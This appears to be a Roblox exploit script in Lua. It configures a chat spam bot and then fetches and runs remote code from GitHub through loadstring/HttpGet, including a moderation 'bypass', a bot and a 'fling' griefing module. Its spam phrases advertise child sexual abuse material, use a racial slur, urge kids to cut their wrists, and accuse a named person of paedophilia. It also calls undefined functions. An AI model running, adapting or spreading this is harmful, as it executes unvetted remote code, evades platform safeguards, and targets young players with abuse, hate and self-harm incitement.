-- 1. CONFIGURATION (Defined first so the loadstrings can see it)
getgenv().BotConfig = {
    DefaultPhrases = {
        {
            "Join for CP/pfYQ9rtdcy",
            "If you want to see a expose of Kiceba then join /pfYQ9rtdcy",
            "THIS GAME IS OWNED BY NIGGERS /pfYQ9rtdcy",
            "/pfYQ9rtdcy. Bots run by YBRATS",
            "JOIN 4 CP /pfYQ9rtdcy",
            "KIDS CUT WRISTS FOR US /pfYQ9rtdcy",
            "Draw blood for US /pfYQ9rtdcy",
            "I hope your hiatus was fun /pfYQ9rtdcy",
            "Baptize Me /pfYQ9rtdcy",
            "KICEBA LIKES CHILDREN /pfYQ9rtdcy",
            "JOIN UP /pfYQ9rtdcy",
            "JOIN PLS /pfYQ9rtdcy",
        }
    }
}

getgenv().Blacklist = {
    blacklistt = {{}}
}

-- 2. FUNCTION DEFINITIONS
local function runAFK()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
end

local function byp() -- Renamed so it doesn't conflict
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/bypass.lua"))()
end

-- 3. THE ACTUAL EXECUTION (The loadstrings you want in the main script)
task.spawn(byp)
task.wait(1) -- Essential delay so the bypass loads before the bot talks
task.spawn(runAFK)

-- Loading the Bot and Fling directly in the main script as loadstrings
loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/Bot.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/Fling.lua"))()

-- 4. TRIGGERING THE FUNCTIONS
task.spawn(tio)
task.spawn(awz)
